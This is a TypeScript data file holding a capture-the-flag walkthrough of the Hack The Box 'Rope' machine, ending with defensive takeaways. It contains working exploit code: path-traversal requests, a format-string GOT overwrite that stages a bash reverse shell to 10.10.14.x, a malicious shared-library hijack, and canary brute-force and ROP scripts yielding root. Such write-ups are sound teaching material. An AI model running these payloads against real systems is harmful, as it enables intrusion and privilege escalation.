import type { WalkthroughDoc } from "./types";

export const rope: WalkthroughDoc = {
  slug: "rope",
  name: "Rope",
  platform: "Hack The Box",
  os: "Linux",
  difficulty: "Insane",
  retired: "2019",
  ip: "10.10.10.148",
  tags: [
    "Format String",
    "GOT Overwrite",
    "Path Traversal / LFI",
    "ASLR/PIE Bypass",
    "LD_LIBRARY hijack",
    "Stack Canary Brute Force",
    "ret2libc / ROP",
    "pwntools",
  ],
  lede: "One custom binary, three shells. Rope is a pure binary-exploitation gauntlet: an LFI leaks the server binary and its live memory map, a format string in the logger overwrites `puts@GOT` with `system` for a foothold, a world-writable shared library hijacks a `sudo` helper, and a canary-brute-forced 64-bit ROP chain against a root service on `localhost:1337` finishes the job.",
  summary: "An LFI-assisted format-string GOT overwrite lands a shell, a world-writable liblog.so hijack pivots users, and a canary-brute ROP chain against a root service on 1337 gives root.",
  sections: [
    {
      id: "overview",
      num: "00",
      title: "Overview",
      blocks: [
        { kind: "epigraph", text: "“Give a man enough rope and he'll build you an exploit chain.”" },
        { kind: "p", text: "**Rope** is an Insane-rated Linux machine and one of the most exploitation-heavy boxes on Hack The Box. There is almost no web enumeration, no credential reuse, no low-hanging misconfiguration to trip over — every single pivot is earned by understanding and abusing a custom compiled binary. The attack surface is deliberately tiny: two open ports and one hand-written service. What makes the box hard is depth, not breadth." },
        { kind: "p", text: "Three distinct memory-corruption / hijack primitives are chained back to back. Before we start, here is the whole route from an unauthenticated scan to a root shell:" },
        { kind: "h4", text: "Attack chain" },
        {
          kind: "ol",
          items: [
            "**recon** — nmap: only `22` and `9999`",
            "**LFI** — path traversal in `httpserver` → `/etc/passwd`",
            "**leak** — `/proc/self/exe` + `/proc/self/maps` (defeat PIE/ASLR)",
            "**format string** — `printf(uri)` in `log_access()`",
            "**GOT overwrite** — `puts@GOT` → `system` → shell as `john`",
            "**user.txt** — `/home/john/user.txt`",
            "**sudo readlogs** — world-writable `liblog.so` hijack → `r4j`",
            "**contact @ :1337** — root service, byte-by-byte canary brute",
            "**libc leak** — `write()` ROP → `libc` base",
            "**ret2system** — second ROP → root → `root.txt`",
          ],
        },
        { kind: "callout", variant: "note", title: "What you'll want on hand", text: "A working `pwntools` install, `Ghidra` (or your disassembler of choice) for reversing the two ELFs, and a copy of Ubuntu 18.04's `libc-2.27` (i386 *and* amd64) so your gadget and function offsets match the target byte-for-byte. Everything downstream depends on getting those offsets right." },
      ],
    },
    {
      id: "recon",
      num: "01",
      title: "Enumeration",
      blocks: [
        { kind: "h3", text: "Port scan" },
        { kind: "p", text: "A full TCP sweep followed by a targeted service scan shows just how small the surface is — SSH and one unidentified service high up the port range." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ nmap -p- --min-rate 10000 -oA rope 10.10.10.148",
            "$ nmap -sC -sV -p22,9999 10.10.10.148",
            "PORT     STATE SERVICE VERSION",
            "22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)",
            "9999/tcp open  http    (unrecognized — returns data but no version match)",
            "SF-Port9999-TCP:V=7.70,...HTTP/1.1 200 OK  Accept-Ranges: bytes ...Login V10",
          ],
        },
        { kind: "p", text: "Port `9999` answers HTTP but nmap cannot fingerprint it: the banner shows an HTML login page titled *Login V10*, and version detection comes back empty because this is a bespoke ELF, not a stock daemon. On an Insane box, an unrecognisable custom service is the whole game — so we point everything at it." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ curl -s http://10.10.10.148:9999/ | head",
            "<!-- Login V10 -->  (static login form, no backend)",
          ],
        },
        { kind: "callout", variant: "tip", title: "`Accept-Ranges: bytes` is a gift", text: "The custom server honours the HTTP `Range` header. That is a small detail on recon, but it matters a lot later: it lets us do partial reads of large `/proc` pseudo-files once we find a file-read primitive. Bank it." },
        {
          kind: "table",
          columns: ["Port", "Service", "Detail"],
          rows: [
            ["22/tcp", "OpenSSH 7.6p1", "Ubuntu 18.04 Bionic — libc 2.27"],
            ["9999/tcp", "httpserver (custom ELF)", "serves the *Login V10* page"],
          ],
        },
      ],
    },
    {
      id: "lfi",
      num: "02",
      title: "Path traversal & LFI",
      blocks: [
        { kind: "p", text: "The login form is a decoy — any credentials return `File not found`, which tells us the server maps request paths to files on disk rather than authenticating anything. Fuzzing the web root only turns up static asset directories, but that file-mapping behaviour is exactly what we want to abuse: if the path handler doesn't confine requests to the web root, we have a directory traversal." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \\",
            "      -u http://10.10.10.148:9999/FUZZ",
            "images   [Status: 200]",
            "css      [Status: 200]",
            "js       [Status: 200]",
            "vendor   [Status: 200]",
            "fonts    [Status: 200]",
          ],
        },
        { kind: "p", text: "Nothing but static content — so we test traversal directly. Using `curl --path-as-is` stops the client from normalising away our `../` sequences before they hit the wire, and we escape the web root straight into `/etc/passwd`." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ curl -s --path-as-is http://10.10.10.148:9999/../../../../etc/passwd",
            "root:x:0:0:root:/root:/bin/bash",
            "john:x:1001:1001:,,,:/home/john:/bin/bash",
            "r4j:x:1000:1000:r4j,,,:/home/r4j:/bin/bash",
          ],
          highlight: [1, 2],
        },
        { kind: "callout", variant: "warn", title: "Don't let your client normalise the path", text: "Most HTTP clients collapse `../` before sending. Use `curl --path-as-is` (or a raw socket), and note that a leading `//` — e.g. `//proc/self/maps` — is frequently needed to coax the handler onto an absolute path. Get this wrong and the traversal silently \"works\" against the web root instead of `/`." },
        { kind: "callout", variant: "key", title: "Recovered", text: "Two interactive users: **john** (uid 1001) — the account `httpserver` runs as — and **r4j** (uid 1000), the box author's handle. The *Login V10* form has no auth backend; the real vulnerability is the traversal in the path handler." },
      ],
    },
    {
      id: "leak",
      num: "03",
      title: "Leaking the binary & its memory map",
      blocks: [
        { kind: "p", text: "An LFI on a compiled service is far more than a file-read — it is a foothold into the process's address space. To exploit a PIE binary under ASLR we need two things: the exact binary (to find offsets and build the payload) and the runtime base addresses (to make those offsets absolute). The `/proc` filesystem hands us both. `/proc/self/exe` is the running `httpserver` itself; `/proc/self/maps` is the live memory layout of the process handling our request." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ curl -s --path-as-is http://10.10.10.148:9999/../../../../proc/self/exe -o httpserver",
            "$ file httpserver",
            "httpserver: ELF 32-bit LSB pie executable, Intel 80386, dynamically linked",
            "$ checksec --file=httpserver",
            "Canary found      NX enabled      PIE enabled      Partial RELRO",
          ],
          highlight: [4],
        },
        { kind: "p", text: "So it is a 32-bit PIE with a stack canary and NX — but only **Partial RELRO**, which leaves the GOT writable. That single relaxation is what makes a GOT-overwrite attack viable. Next we read the process map, using the `Range` header we spotted on recon to pull just the head of the file." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ curl -s -H 'Range: bytes=0-4000' --path-as-is \\",
            "      'http://10.10.10.148:9999//proc/self/maps'",
            "565ab000-565ac000 r--p ... /opt/www/httpserver          <- image base ~0x565ab000",
            "565ac000-565ae000 r-xp ... /opt/www/httpserver",
            "f7dc0000-f7f6b000 r-xp ... /lib/i386-linux-gnu/libc-2.27.so  <- libc base",
          ],
          highlight: [2, 4],
        },
        { kind: "callout", variant: "warn", title: "Leak at exploit time — never hardcode", text: "PIE + ASLR mean the `httpserver` and `libc` bases move on every boot (and can differ per forked child). We must read `/proc/self/maps` *as part of the exploit run* and compute `system()` from the leaked libc base each time. Reading `/proc/self/exe` rather than a guessed path also guarantees we grab the exact binary the target is executing." },
        { kind: "callout", variant: "key", title: "Recovered", text: "Binary path `/opt/www/httpserver` (32-bit PIE, Partial RELRO), `libc-2.27` (i386), and a live disclosure of both `httpserver_base` and `libc_base`. With Partial RELRO the GOT is writable — the door for the format string is now open." },
      ],
    },
    {
      id: "fmtbug",
      num: "04",
      title: "Reversing the format-string bug",
      blocks: [
        { kind: "epigraph", text: "“Never pass user input where a format string is expected.” — the entire lesson of this box" },
        { kind: "p", text: "Dropping `httpserver` into Ghidra, the request flow is small. Each request is logged by a routine we'll call `log_access()`, and the decompilation shows the classic mistake: the client-controlled request URI is handed straight to `printf` as the *format string* rather than as an argument." },
        {
          kind: "code",
          lang: "c",
          label: "c — Ghidra decompilation (cleaned)",
          lines: [
            "void log_access(int fd, char *method, char *uri) {",
            "    ...",
            "    printf(uri);          /* <-- uri is attacker-controlled: format string bug */",
            "    ...",
            "}",
          ],
          highlight: [2],
        },
        { kind: "p", text: "`printf(uri)` gives us an arbitrary read/write primitive. To use it we need to know where our controlled bytes land in `printf`'s stack view. We send a positional-argument probe and count until our own request data is reflected — the URI sits at stack argument **position 53**, with a neighbouring slot at **54** we'll use for the high-order bytes of a write." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "# %2553$x  ==  %53$x once URL-decoded — print the 53rd stack arg",
            "$ curl --path-as-is 'http://10.10.10.148:9999/AAAA.%2553%24x'",
            "AAAA.41414141        # our marker echoed back -> controlled data at offset 53",
          ],
          highlight: [2],
        },
        { kind: "callout", variant: "note", title: "Why offset matters", text: "A format-string write with `%hhn` places the byte count *at whatever address sits at the referenced stack slot*. Since our request bytes are at slot 53, we can stage the target address (`puts@GOT`) there and drive a controlled write — one byte at a time — to any location we choose." },
      ],
    },
    {
      id: "rce",
      num: "05",
      title: "Format-string RCE → shell as john",
      blocks: [
        { kind: "p", text: "The plan is a GOT overwrite. `httpserver` calls `puts()` on the request buffer during handling, so if we replace `puts@GOT` with the address of `system()`, that call becomes `system(request_buffer)` — and whatever command we stage in the buffer runs. The steps per request are: read the live bases from `/proc/self/maps`, compute `system = libc_base + 0x3cd10`, then use `%hhn` writes at positions 53/54 to patch each byte of `puts@GOT`." },
        {
          kind: "code",
          lang: "python",
          label: "python — exploit skeleton (pwntools)",
          lines: [
            "from pwn import *",
            "",
            "# 1) leak bases via the LFI on /proc/self/maps",
            "httpserver_base, libc_base = leak_maps('10.10.10.148', 9999)",
            "system = libc_base + 0x3cd10          # libc-2.27 i386 system() offset",
            "puts_got = httpserver_base + 0x5048   # puts@GOT",
            "",
            "# 2) format-string write: overwrite puts@GOT with system, byte by byte",
            "#    low half via arg 53, high half via arg 54",
            "payload = fmtstr_payload(53, {puts_got: system}, write_size='byte')",
            "",
            "# 3) stage the command at request offset 0x400; spaces -> ${IFS}",
            "cmd = 'bash${IFS}-c${IFS}\"bash${IFS}-i>&/dev/tcp/10.10.14.x/443<&1\"'",
            "send_request(payload, cmd_at_offset=0x400)",
          ],
        },
        { kind: "p", text: "Fire it with a listener up and the box connects back. Because `httpserver` runs as **john**, the shell we catch is john's." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ nc -lvnp 443",
            "$ python3 exploit.py 10.10.10.148 9999",
            "# ... connection received ...",
            "$ id",
            "uid=1001(john) gid=1001(john) groups=1001(john)",
          ],
          highlight: [4],
        },
        { kind: "callout", variant: "warn", title: "Two things that will break the shell", text: "**(1)** The request parser splits on spaces (method / path / version), so any literal space in your command is eaten — encode them as `${IFS}` (or tabs / `%20`). **(2)** The server forks per request: your GOT write and the subsequent `puts` call must happen in the *same* child, so keep the whole primitive inside one request, and recompute `system()` from a fresh `/proc/self/maps` leak on every run because ASLR moves libc." },
      ],
    },
    {
      id: "user",
      num: "06",
      title: "user.txt",
      blocks: [
        { kind: "p", text: "As john we can read the user flag from his home directory. Upgrade the shell to a proper TTY first (`python3 -c 'import pty; pty.spawn(\"/bin/bash\")'`) so the following privilege-escalation steps behave." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ cat /home/john/user.txt",
            "76a8fc64····························",
          ],
          highlight: [1],
        },
        { kind: "p", text: "One flag down, but john is only the first of three identities we need. The box is Ubuntu 18.04, and the next pivot is a `sudo` grant that lets john run a helper as **r4j**." },
      ],
    },
    {
      id: "r4j",
      num: "07",
      title: "john → r4j via liblog.so hijack",
      blocks: [
        { kind: "p", text: "Checking john's `sudo` rights reveals a password-less grant to run a 64-bit helper, `/usr/bin/readlogs`, as **r4j**. That binary dynamically loads a custom shared library — and that library is world-writable, which turns a benign-looking sudo entry into a straightforward library hijack." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ sudo -l",
            "User john may run the following commands on rope:",
            "    (r4j) NOPASSWD: /usr/bin/readlogs",
            "$ ldd /usr/bin/readlogs",
            "    liblog.so => /lib/x86_64-linux-gnu/liblog.so",
            "$ ls -la /lib/x86_64-linux-gnu/liblog.so",
            "-rwxrwxrwx 1 root root ... /lib/x86_64-linux-gnu/liblog.so",
          ],
          highlight: [2, 6],
        },
        { kind: "p", text: "Mode `0777` on a library loaded by a sudo-run binary means john can replace it. We compile a malicious `liblog.so` that exports the same symbol `readlogs` imports — `printlog()` — but whose body drops a shell. When the sudo command loads our library, our code runs in **r4j**'s context." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ cat > /tmp/liblog.c <<'EOF'",
            "#include <stdlib.h>",
            "void printlog(){ setuid(1000); setgid(1000); system(\"/bin/sh\"); }",
            "EOF",
            "$ gcc -shared -fPIC -o /lib/x86_64-linux-gnu/liblog.so /tmp/liblog.c",
            "$ sudo -u r4j /usr/bin/readlogs",
            "$ id",
            "uid=1000(r4j) gid=1000(r4j) groups=1000(r4j),4(adm)",
          ],
          highlight: [7],
        },
        { kind: "callout", variant: "warn", title: "Match the symbol exactly", text: "The loader resolves the specific function name and signature `readlogs` imports (`printlog`). Get the name or prototype wrong and the dynamic loader errors out instead of executing your payload. Keep a backup of the original `liblog.so` if you want `readlogs` to stay functional for later runs." },
        { kind: "callout", variant: "key", title: "Recovered", text: "A shell as **r4j** (uid 1000, member of `adm`) — no password, purely a `0777` shared-library hijack sitting between the two hard exploitation phases. r4j is required to reach the final root exploit; there is no shortcut around this pivot." },
      ],
    },
    {
      id: "contact",
      num: "08",
      title: "The root service on localhost:1337",
      blocks: [
        { kind: "p", text: "As r4j we can finally see what root is running. A binary called `contact` is owned by root and listens only on `127.0.0.1:1337` — invisible from the outside, reachable now that we are on the box. Pulling it and running `checksec` shows a fully hardened target, and reversing `recv_data()` reveals the bug hiding behind all that armour." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ ss -tlnp | grep 1337",
            "LISTEN 0 ... 127.0.0.1:1337 ...  users:((\"contact\",...))",
            "$ checksec contact",
            "Canary ENABLED   NX ENABLED   PIE ENABLED   RELRO Partial",
          ],
        },
        {
          kind: "code",
          lang: "c",
          label: "c — recv_data() (cleaned)",
          lines: [
            "void recv_data(int client) {",
            "    char buf[56];              /* 56-byte stack buffer */",
            "    recv(client, buf, 0x400, 0);  /* reads up to 1024 bytes — clean overflow */",
            "    ...",
            "}",
          ],
          highlight: [3],
        },
        { kind: "p", text: "`recv_data()` reads up to `0x400` (1024) bytes into a 56-byte buffer: a textbook stack overflow. But with a canary, NX and PIE all enabled, a naive smash just crashes the child. The way through is the service's own architecture — it `fork()`s a child per connection, and children inherit the parent's canary and image base unchanged." },
        { kind: "callout", variant: "note", title: "Why forking makes this beatable", text: "Because every connection is served by a fresh `fork()` of a long-lived parent, the stack canary and PIE base are identical across connections and the parent never dies. That lets us leak both a **byte at a time** by observing whether a child survives — the defence that normally stops us is exactly what we'll grind down." },
      ],
    },
    {
      id: "canary",
      num: "09",
      title: "Byte-by-byte canary & base brute force",
      blocks: [
        { kind: "p", text: "The buffer sits 56 bytes below the saved canary. We send 56 bytes of padding plus one guessed byte and watch the response: if the guess matches the real canary byte, the child continues and returns its normal `Done.`; if it's wrong, the canary check trips and the child dies to EOF. Loop `0x00`–`0xff` for each of the 8 canary bytes, then keep going through the saved RBP and the return address the same way." },
        {
          kind: "code",
          lang: "python",
          label: "python — leak one byte",
          lines: [
            "from pwn import *",
            "",
            "def leak_byte(known):",
            "    for b in range(256):",
            "        io = remote('127.0.0.1', 1337)",
            "        io.send(b'A'*56 + known + bytes([b]))",
            "        resp = io.recvall(timeout=1)",
            "        io.close()",
            "        if b'Done.' in resp:      # survived -> correct byte",
            "            return bytes([b])",
            "    raise Exception('no byte kept the child alive')",
            "",
            "canary = b'\\x00'                  # LSB of the canary is always null",
            "while len(canary) < 8:",
            "    canary += leak_byte(canary)",
            "log.success(f'canary = {canary.hex()}')",
          ],
        },
        { kind: "p", text: "We extend the same technique past the canary to recover the saved return address, which reveals the PIE image base: the return-address offset from the base is a fixed `0x1562`, so `program_base = leaked_ret - 0x1562`. With the canary and base known, the fully-hardened binary is now just a plain overflow." },
        { kind: "callout", variant: "tip", title: "Shrink the keyspace", text: "You don't have to brute all bytes blindly. The canary's least-significant byte is always `\\x00` on Linux, and the return address low byte is fixed at `\\x62`; both are effectively known, so only the varying bytes need a 0–255 sweep. That cuts the search dramatically and keeps the whole leak to a few seconds per byte." },
        { kind: "callout", variant: "key", title: "Recovered", text: "The stack **canary** (8 bytes, LSB `\\x00`) and the **PIE base** (`program_base = leaked_ret - 0x1562`). Both are stable across connections thanks to the shared-parent fork model — everything the ROP needs is now in hand." },
      ],
    },
    {
      id: "libcleak",
      num: "10",
      title: "Leaking libc with a write() ROP",
      blocks: [
        { kind: "p", text: "NX means we can't run shellcode, so we return-oriented-program. First we need libc's runtime base, which we don't have yet. The trick is a ROP chain that calls `write()` to send a known GOT entry — `write@GOT`, already resolved to a real libc address — back down our own socket. We build the chain from `pop rdi; pop rsi; pop rdx` gadgets in the (now de-randomised) image, setting `rdi = 3` (the child's socket fd), `rsi = &write@GOT`, `rdx = 8`." },
        {
          kind: "code",
          lang: "python",
          label: "python — stage 1: leak libc",
          lines: [
            "base    = leaked_ret - 0x1562",
            "rop     = ROP(elf_at(base))",
            "chain   = flat(",
            "    b'A'*56, canary, b'B'*8,          # padding + canary + saved RBP",
            "    rop.find_gadget(['pop rdi','ret']).address, 3,        # fd = socket",
            "    rop.find_gadget(['pop rsi','ret']).address, base + write_got,",
            "    rop.find_gadget(['pop rdx','ret']).address, 8,",
            "    base + write_plt,                 # write(3, &write@GOT, 8)",
            ")",
            "io.send(chain)",
            "leaked_write = u64(io.recv(8))",
            "libc_base    = leaked_write - 0x0f6e0    # write() offset, libc-2.27 amd64",
            "log.success(f'libc base = {hex(libc_base)}')",
          ],
          highlight: [12, 13],
        },
        { kind: "p", text: "The 8 bytes that come back down the socket are the live address of `write()` in libc. Subtracting its known offset in `libc-2.27` (`0x0f6e0`) yields the libc base — and from there every libc symbol, including `system()` and a `/bin/sh` string, becomes an absolute address." },
        { kind: "callout", variant: "warn", title: "The socket fd is (usually) 3", text: "Inside each forked child the accepted connection is typically file descriptor **3**, so that's the `rdi` value for the `write()` leak. And you *must* compute offsets against the exact `libc-2.27` on the box — a mismatched libc gives wrong gadget/function offsets and the chain silently lands on garbage. Download or copy the target's libc rather than guessing." },
      ],
    },
    {
      id: "root",
      num: "11",
      title: "ret2system → root shell",
      blocks: [
        { kind: "p", text: "With the libc base leaked, the second stage is a clean ret2libc. We reconnect (canary and PIE base are unchanged), rebuild the overflow, and this time return into `system(\"/bin/sh\")` — pointing `rdi` at the `/bin/sh` string inside libc. Because `contact` runs as root, the shell it spawns is root's." },
        {
          kind: "code",
          lang: "python",
          label: "python — stage 2: system('/bin/sh')",
          lines: [
            "system  = libc_base + 0x0453a0     # libc-2.27 amd64 system()",
            "binsh   = libc_base + next(libc.search(b'/bin/sh'))",
            "ret     = rop.find_gadget(['ret']).address        # stack-align for movaps",
            "",
            "chain = flat(",
            "    b'A'*56, canary, b'B'*8,",
            "    rop.find_gadget(['pop rdi','ret']).address, binsh,",
            "    base + ret,",
            "    system,                        # system('/bin/sh') as root",
            ")",
            "io.send(chain)",
            "io.interactive()",
          ],
        },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ python3 root.py",
            "# ... shell on 127.0.0.1:1337 ...",
            "# id",
            "uid=0(root) gid=0(root) groups=0(root)",
          ],
          highlight: [3],
        },
        { kind: "callout", variant: "tip", title: "Keep the stack aligned", text: "`libc-2.27`'s `system()` executes a `movaps` instruction that faults if `rsp` isn't 16-byte aligned. If your chain crashes right at the `system()` call, splice a bare `ret` gadget in before it (as above) to nudge the alignment — a classic gotcha on modern glibc ROP." },
      ],
    },
    {
      id: "rootflag",
      num: "12",
      title: "root.txt",
      blocks: [
        { kind: "p", text: "The `contact` shell is root, so the final flag is a single `cat` away." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "# cat /root/root.txt",
            "b91ccec2····························",
          ],
          highlight: [1],
        },
        { kind: "p", text: "Three primitives, three shells, no credential ever guessed: format string → GOT overwrite → library hijack → canary-brute ROP. Rope earns its rating by demanding you actually understand each defence you defeat." },
      ],
    },
    {
      id: "defense",
      num: "13",
      title: "Defensive takeaways",
      blocks: [
        {
          kind: "ul",
          items: [
            "**Never pass user input as a format string.** The entire foothold is one `printf(uri)` call in `log_access()`. Always write `printf(\"%s\", data)`; enable `-Wformat -Wformat-security` and treat those warnings as errors.",
            "**Canonicalise and confine file paths.** The traversal that leaked the binary and `/proc/self/maps` came from concatenating request paths onto a web root without resolving `..`. Resolve to an absolute path and verify it stays inside the served directory.",
            "**Treat `/proc/self/maps` and `/proc/self/exe` disclosure as critical.** They hand an attacker the PIE and libc bases needed to defeat ASLR. Restrict access to `/proc` and never let a network service read arbitrary files.",
            "**Never make libraries world-writable.** `liblog.so` at mode `0777`, loaded by a `sudo`-run helper, turned a benign grant into instant privilege escalation. Audit `sudoers` for helpers that load external code and lock down their dependencies.",
            "**Compile with Full RELRO.** A read-only GOT would have blocked the `puts@GOT` → `system` overwrite outright. Pair it with `-fstack-protector-strong` and bounds-checked reads instead of `recv` into an undersized stack buffer.",
            "**Re-randomise per child in forking servers.** Sharing the stack canary and PIE base across `fork()` is what enabled the byte-by-byte brute force despite full hardening. `exec()` fresh children, or re-randomise, so a crashing child never teaches the attacker anything.",
          ],
        },
        { kind: "callout", variant: "note", title: "Skills exercised", text: "path-traversal LFI · `/proc` memory-map disclosure · PIE/ASLR bypass · format-string arbitrary write · GOT overwrite → `system` · shared-library hijack via `sudo` · stack-canary brute force across `fork()` · ret2libc / ROP chaining · libc leak via `write()` · `pwntools` exploit development." },
      ],
    },
  ],
};
